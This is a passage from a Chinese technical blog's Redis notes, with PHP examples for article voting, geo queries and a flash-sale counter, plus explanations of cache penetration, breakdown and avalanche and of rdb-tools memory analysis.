class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">一个用户对一篇文章只能投一票</span><br><span class="line">一篇文章发布 <span class="number">7</span> 天后不能再进行投票</span><br><span class="line">文章得分计算规则：发布时间 + 得票数 X 倍数（这里的倍数计算规则为：<span class="number">86400</span>/<span class="number">200</span>=<span class="number">432</span>，<span class="number">86400</span> 为一天的秒数，<span class="number">200</span> 为一天时间对应的投票数</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Redis In Action</span></span><br><span class="line"><span class="comment"> * 文章投票功能</span></span><br><span class="line"><span class="comment"> * 前提条件：</span></span><br><span class="line"><span class="comment"> * 文章发表时，记录作者、发表时间、链接、标题、初始投票数</span></span><br><span class="line"><span class="comment"> * 每获得一个投票，文章获得432分（86400/200）</span></span><br><span class="line"><span class="comment"> * 数据结构：</span></span><br><span class="line"><span class="comment"> * 文章hash -- 每篇文章key的形式如：article:92617</span></span><br><span class="line"><span class="comment"> * 文章发表时间zset集合（time:），按时间排序 -- 每条记录的形式如：article:92617（member）  1332065417（score）</span></span><br><span class="line"><span class="comment"> * 文章得分zset集合(score:)，按分数排序</span></span><br><span class="line"><span class="comment"> * 用户对文章的投票set集合(vote:xxxx) -- key形式如：vote:100408，item形式如：user:233487</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> ONE_WEEK_IN_SECONDS = <span class="number">7</span> * <span class="number">86400</span>;</span><br><span class="line"><span class="keyword">const</span> VOTE_SCORE = <span class="number">432</span>;</span><br><span class="line"><span class="keyword">const</span> ARTICLES_PER_PAGE = <span class="number">25</span>;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="string">'6379'</span>) || exit(<span class="string">'连接失败！'</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文章投票</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $user</span></span><br><span class="line"><span class="comment"> * @param $article</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">articleVote</span>(<span class="params">$redis, $user, $article</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cutoff = time() - ONE_WEEK_IN_SECONDS;</span><br><span class="line">    <span class="comment">//对发表时间超过一周的文章投票不生效</span></span><br><span class="line">    <span class="comment">//获取 time: 有序集合对应 member 的 score</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;zScore(<span class="string">'time:'</span>, $article) &lt; $cutoff) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $article_id = explode(<span class="string">':'</span>, $article)[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//无序集合，添加记录，如果记录存在，返回0（说明用户已对该文章投票），反之则计算分数</span></span><br><span class="line">    <span class="keyword">if</span> ($redis-&gt;sAdd(<span class="string">'voted:'</span> . $article_id, $user)) &#123;</span><br><span class="line">        <span class="comment">// 使用事务操作</span></span><br><span class="line">        <span class="comment">/*$redis-&gt;multi()</span></span><br><span class="line"><span class="comment">            -&gt;zIncrBy('score:' , VOTE_SCORE, $article) //增加文章的分数</span></span><br><span class="line"><span class="comment">            -&gt;hIncrBy($article, 'votes', 1)  //增加文章的投票数</span></span><br><span class="line"><span class="comment">            -&gt;exec();*/</span></span><br><span class="line">        <span class="comment">//使用pipeline型的事务</span></span><br><span class="line">        <span class="comment">//一次性向服务端发送所有命令，减少客户端与服务端之间通讯往返次数</span></span><br><span class="line">        $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">        $pipe-&gt;zIncrBy(<span class="string">'score:'</span>, VOTE_SCORE, $article);</span><br><span class="line">        $pipe-&gt;hIncrBy($article, <span class="string">'votes'</span>, <span class="number">1</span>);</span><br><span class="line">        $pipe-&gt;exec();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发表文章</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param string $user example: 'user:123456'</span></span><br><span class="line"><span class="comment"> * @param $title</span></span><br><span class="line"><span class="comment"> * @param $link</span></span><br><span class="line"><span class="comment"> * @return integer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postArticle</span>(<span class="params">$redis, $user, $title, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article_id = $redis-&gt;incr(<span class="string">'article:'</span>);  <span class="comment">//自增1，不存在key则赋值1</span></span><br><span class="line">    $voted = <span class="string">'voted:'</span> . $article_id;</span><br><span class="line">    $redis-&gt;sAdd($voted, $user);  <span class="comment">//将作者设为已投票用户</span></span><br><span class="line">    $redis-&gt;expire($voted, ONE_WEEK_IN_SECONDS);  <span class="comment">//文章投票信息设置为一周后自动失效</span></span><br><span class="line">    $now = time();</span><br><span class="line">    <span class="comment">//添加文章</span></span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;  <span class="comment">//作为文章hash的key值</span></span><br><span class="line">    $redis-&gt;hMSet($article, [  <span class="comment">//批量设置hash键值对</span></span><br><span class="line">        <span class="string">'title'</span> =&gt; $title,</span><br><span class="line">		<span class="string">'link'</span> =&gt; $link,</span><br><span class="line">		<span class="string">'poster'</span> =&gt; $user,</span><br><span class="line">		<span class="string">'time'</span> =&gt; $now,</span><br><span class="line">		<span class="string">'votes'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="comment">//注意zadd第二个参数为score，第三个为member</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'score:'</span>, $now + VOTE_SCORE, $article);  <span class="comment">//设置文章初始分数</span></span><br><span class="line">    $redis-&gt;zAdd(<span class="string">'time:'</span>,  $now, $article);  <span class="comment">//记录文章发表时间</span></span><br><span class="line">    <span class="keyword">return</span> $article_id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取文章列表</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order  用来排序的有序集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArticles</span>(<span class="params">$redis, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = ($page - <span class="number">1</span>) * ARTICLES_PER_PAGE;</span><br><span class="line">	$end = $start + ARTICLES_PER_PAGE - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//获取指定范围内的member值（文章ID，article:123456），按$order分数递减排序</span></span><br><span class="line">    $ids = $redis-&gt;zRevRange($order, $start, $end);</span><br><span class="line">    $pipe = $redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">    foreach ($ids <span class="keyword">as</span> $id) &#123;</span><br><span class="line">        $pipe-&gt;hGetAll($id);</span><br><span class="line">        <span class="comment">//不使用pipeline的时候</span></span><br><span class="line">        <span class="comment">/*$article_data = $redis-&gt;hGetAll($id);</span></span><br><span class="line"><span class="comment">        $article_data['id'] = $id;</span></span><br><span class="line"><span class="comment">        $articles[] = $article_data;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    $articles = $pipe-&gt;exec();</span><br><span class="line">    <span class="comment">//把文章ID加回去</span></span><br><span class="line">    foreach ($articles <span class="keyword">as</span> $k =&gt; $article) &#123;</span><br><span class="line">        $articles[$k][<span class="string">'id'</span>] = $ids[$k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $articles;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加/移除文章分类</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $article_id</span></span><br><span class="line"><span class="comment"> * @param array $to_add</span></span><br><span class="line"><span class="comment"> * @param array $to_remove</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addRemoveGroups</span>(<span class="params">$redis, $article_id, $to_add = [], $to_remove = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $article = <span class="string">'article:'</span> . $article_id;</span><br><span class="line">    foreach ($to_add <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sAdd(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($to_remove <span class="keyword">as</span> $group) &#123;</span><br><span class="line">        $redis-&gt;sRem(<span class="string">'group:'</span> . $group, $article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取分组下的文章数据</span></span><br><span class="line"><span class="comment"> * @param Redis $redis</span></span><br><span class="line"><span class="comment"> * @param $group</span></span><br><span class="line"><span class="comment"> * @param $page</span></span><br><span class="line"><span class="comment"> * @param string $order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGroupArticles</span>(<span class="params">$redis, $group, $page, $order = <span class="string">'score:'</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = $order . $group;</span><br><span class="line">    <span class="keyword">if</span> (!$redis-&gt;exists($key)) &#123;</span><br><span class="line">        <span class="comment">//获得对应分组下，文章-分数的有序集合</span></span><br><span class="line">        $redis-&gt;zInterStore($key, [<span class="string">'group:'</span> . $group, $order], [<span class="number">1</span>, <span class="number">1</span>], <span class="string">'max'</span>);</span><br><span class="line">        $redis-&gt;expire($key, <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getArticles($redis, $page, $key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发布若干文章</span></span><br><span class="line">postArticle($redis, <span class="string">'user:1'</span>, <span class="string">'测试文章1'</span>, <span class="string">'article-link-1'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:2'</span>, <span class="string">'测试文章2'</span>, <span class="string">'article-link-2'</span>);</span><br><span class="line">postArticle($redis, <span class="string">'user:3'</span>, <span class="string">'测试文章3'</span>, <span class="string">'article-link-3'</span>);</span><br><span class="line"><span class="comment">//用户10对文章1进行投票</span></span><br><span class="line">articleVote($redis, <span class="string">'user:10'</span>, <span class="string">'article:1'</span>);</span><br><span class="line">echo <span class="string">"article:1 的投票用户:"</span> . PHP_EOL;</span><br><span class="line">$result = $redis-&gt;sMembers(<span class="string">'voted:1'</span>);</span><br><span class="line">print_r($result);</span><br><span class="line">echo <span class="string">"各文章得分:"</span> . PHP_EOL;</span><br><span class="line">$scores = $redis-&gt;zRange(<span class="string">'score:'</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="string">'withscores'</span>);</span><br><span class="line">print_r($scores);</span><br><span class="line">echo <span class="string">"文章列表:"</span> . PHP_EOL;</span><br><span class="line">$articles = getArticles($redis, <span class="number">1</span>);</span><br><span class="line">print_r($articles);</span><br><span class="line">exit();</span><br><span class="line"><span class="comment">//给文章添加分类</span></span><br><span class="line">addRemoveGroups($redis, <span class="string">'1'</span>, [<span class="string">'php'</span>, <span class="string">'redis'</span>]);</span><br><span class="line">addRemoveGroups($redis, <span class="string">'2'</span>, [<span class="string">'python'</span>, <span class="string">'redis'</span>]);</span><br><span class="line"><span class="comment">//获取‘redis’分组下的文章</span></span><br><span class="line">$redisGroupArticles = getGroupArticles($redis, <span class="string">'redis'</span>, <span class="number">1</span>);</span><br><span class="line">echo <span class="string">"redis分类的文章列表:"</span> . PHP_EOL;</span><br><span class="line">print_r($redisGroupArticles);</span><br><span class="line">https:<span class="comment">//github.com/HubQin/redis-in-action-php/blob/master/article_voting.php</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/29511</span></span><br></pre></td></tr></table></figure>
<h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">缓存穿透 ： DB 承受了没有必要的查询流量，意思就是查到空值的时候没有做缓存处理，再次查询的时候继续读库了</span><br><span class="line">缓存击穿：热点 Key，大量并发读请求引起的小雪崩， 就是缓存在某个时间点过期的时候，恰好在这个时间点对这个 Key 有大量的并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮</span><br><span class="line">缓存雪崩：缓存设置同一过期时间，引发的大量的读取数据库操作</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/fef1c22d63cb</span></span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）缓存穿透</span><br><span class="line"></span><br><span class="line">请求去查询一条压根儿数据库中根本就不存在的数据，也就是缓存和数据库都查询不到这条数据，但是请求每次都会打到数据库上面去。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 对于返回为 NULL 的依然缓存</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 制定一些规则过滤一些不可能存在的数据</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）缓存击穿</span><br><span class="line"></span><br><span class="line">在平常高并发的系统中，大量的请求同时查询一个 key 时，此时这个 key 正好失效了，就会导致大量的请求都打到数据库上面去。这种现象我们称为缓存击穿。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 加分布式锁，对于获取到这个锁的线程，查询数据库更新缓存，其他线程采取重试策略</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 采取到期自动刷新的策略，而不是到期自动淘汰</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）缓存雪崩</span><br><span class="line"></span><br><span class="line">当某一时刻发生大规模的缓存失效的情况，比如你的缓存服务宕机了，会有大量的请求进来直接打到 DB 上面。</span><br><span class="line"></span><br><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 增加缓存系统可用性，通过监控关注缓存的健康程度，根据业务量适当的扩容缓存。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 采用多级缓存，不同级别缓存设置的超时时间不同，及时某个级别缓存都过期，也有其他级别缓存兜底。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 缓存的过期时间可以取个随机值，尽量让不同 Key 的过期时间不同。</span><br><span class="line"></span><br><span class="line">六、缓存更新策略</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）Cache Aside</span><br><span class="line"></span><br><span class="line">应用查询数据的时候先查询缓存层的数据，如果缓存中没有则到数据库中查询数据，并把数据放入缓存层。</span><br><span class="line"></span><br><span class="line">更新数据的时候先对数据库进行更新，然后通过指令使缓存层的数据失效。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)Read/Write Through</span><br><span class="line"></span><br><span class="line">应用要读数据和更新数据都直接访问缓存服务</span><br><span class="line"></span><br><span class="line">缓存服务同步的将数据更新到数据库</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)Write Behind</span><br><span class="line"></span><br><span class="line">应用要读数据和更新数据都直接访问缓存服务</span><br><span class="line"></span><br><span class="line">缓存服务异步的将数据更新到数据库（通过异步任务）</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29751</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-的-LBS-尝试地理位置"><a href="#Redis-的-LBS-尝试地理位置" class="headerlink" title="Redis 的 LBS 尝试地理位置"></a>Redis 的 LBS 尝试地理位置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.118007'</span>, <span class="string">'30.259293'</span>, <span class="string">'桃园岭'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.119445'</span>,<span class="string">'30.255082'</span>, <span class="string">'农耕科普园'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.071655'</span>,<span class="string">'30.272893'</span>, <span class="string">'西溪湿地'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114321'</span>,<span class="string">'30.221218'</span>, <span class="string">'龙井村'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.145012'</span>,<span class="string">'30.205586'</span>, <span class="string">'白塔公园'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.112912'</span>,<span class="string">'30.224221'</span>, <span class="string">'十里琅珰'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.107264'</span>,<span class="string">'30.206997'</span>, <span class="string">'狮峰'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.117936'</span>,<span class="string">'30.227969'</span>, <span class="string">'真迹寺'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.10826'</span>,<span class="string">'30.246569'</span>, <span class="string">'灵隐寺'</span>);</span><br><span class="line">$redis-&gt;rawCommand(<span class="string">'geoadd'</span>, <span class="string">'location'</span>, <span class="string">'120.114123'</span>,<span class="string">'30.264152'</span>, <span class="string">'状元峰'</span>);</span><br><span class="line">我们获取西溪湿地和龙井村的距离</span><br><span class="line"></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEODIST'</span>, <span class="string">'location'</span>,<span class="string">'西溪湿地'</span>, <span class="string">'龙井村'</span>, <span class="string">'m'</span>);</span><br><span class="line">print_r($ret);  <span class="comment">//7060.0083</span></span><br><span class="line">其他命令：</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回灵隐寺,状元峰的位置</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOPOS'</span>, <span class="string">'location'</span>,<span class="string">'灵隐寺'</span>, <span class="string">'状元峰'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line"><span class="comment">// 返回'120.114253','30.219759'坐标附近1km的地址</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEORADIUS'</span>, <span class="string">'location'</span>,<span class="string">'120.114253'</span>,<span class="string">'30.219759'</span>, <span class="number">1</span>, <span class="string">'km'</span>, <span class="string">'WITHDIST'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOHASH'</span>, <span class="string">'location'</span>,<span class="string">'龙井村'</span>, <span class="string">'灵隐寺'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35871</span></span><br></pre></td></tr></table></figure>
<h3 id="基于redis的秒杀"><a href="#基于redis的秒杀" class="headerlink" title="基于redis的秒杀"></a>基于redis的秒杀</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化redis</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//连接</span></span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$key = <span class="string">'sale'</span>;</span><br><span class="line"><span class="comment">//检测是否连接成功</span></span><br><span class="line"><span class="comment">// echo "Server is running: " . $redis-&gt;ping();</span></span><br><span class="line">$redis-&gt;setnx($key, <span class="number">0</span>);</span><br><span class="line">$redis-&gt;watch($key); <span class="comment">//监测一个key的值是否被更改</span></span><br><span class="line"></span><br><span class="line">$sale_num = $redis-&gt;get($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($sale_num &gt; <span class="number">4</span>) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;multi(); <span class="comment">//标记事务</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;incr($key);  <span class="comment">//销量+1</span></span><br><span class="line">sleep(<span class="number">1</span>); <span class="comment">//模拟真实环境</span></span><br><span class="line">$ret = $redis-&gt;exec(); <span class="comment">// 事务块内所有命令的返回值，按命令执行的先后顺序排列。</span></span><br><span class="line"><span class="keyword">if</span> ($ret) &#123;</span><br><span class="line">    include <span class="string">'db.php'</span>;</span><br><span class="line">    $db = <span class="keyword">new</span> db([</span><br><span class="line">        <span class="string">'database_type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">        <span class="string">'database_name'</span> =&gt; <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'server'</span> =&gt; <span class="string">'www.13sai.com&amp;#39;,</span></span><br><span class="line"><span class="string">        '</span>username<span class="string">' =&gt; '</span><span class="number">13</span>sai<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>password<span class="string">' =&gt; '</span>*<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>charset<span class="string">' =&gt; '</span>utf8<span class="string">'</span></span><br><span class="line"><span class="string">    ]);</span></span><br><span class="line"><span class="string">    $db-&gt;update('</span>goods<span class="string">', ["stock_num[-]" =&gt; 1], ['</span>id<span class="string">' =&gt; 1]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="查看所有-key-的-value-值所占内存大小"><a href="#查看所有-key-的-value-值所占内存大小" class="headerlink" title="查看所有 key 的 value 值所占内存大小"></a>查看所有 key 的 value 值所占内存大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">综上，得知其路径为：/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">按内存值导出 csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-快速上手"><a href="#Redis-快速上手" class="headerlink" title="Redis 快速上手"></a>Redis 快速上手</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Redis 的事务处理的命令</span><br><span class="line"></span><br><span class="line">MULTI：开启一个事务；</span><br><span class="line">EXEC：事务执行，将一次性执行事务内的所有命令；</span><br><span class="line">DISCARD：取消事务；</span><br><span class="line">WATCH：监视一个或多个键，如果事务执行前某个键发生了改动，那么事务也会被打断；</span><br><span class="line">UNWATCH：取消 WATCH 命令对所有键的监视。</span><br><span class="line"></span><br><span class="line">需要说明的是 Redis 实现事务是基于 COMMAND 队列，</span><br><span class="line">如果 Redis 没有开启事务，那么任何的 COMMAND 都会立即执行并返回结果。</span><br><span class="line">如果 Redis 开启了事务，COMMAND 命令会放到队列中，并且返回排队的状态 QUEUED，</span><br><span class="line">只有调用 EXEC，才会执行 COMMAND 队列中的命令。</span><br><span class="line">玩家排行榜案例</span><br><span class="line"></span><br><span class="line">统计全部玩家的排行榜</span><br><span class="line">ZREVRANGE user_score <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"></span><br><span class="line">按名次查询排名前 N 名的玩家</span><br><span class="line">统计前 <span class="number">10</span> 名玩家，可以使用：ZREVRANGE user_score <span class="number">0</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line">查询某个玩家的分数</span><br><span 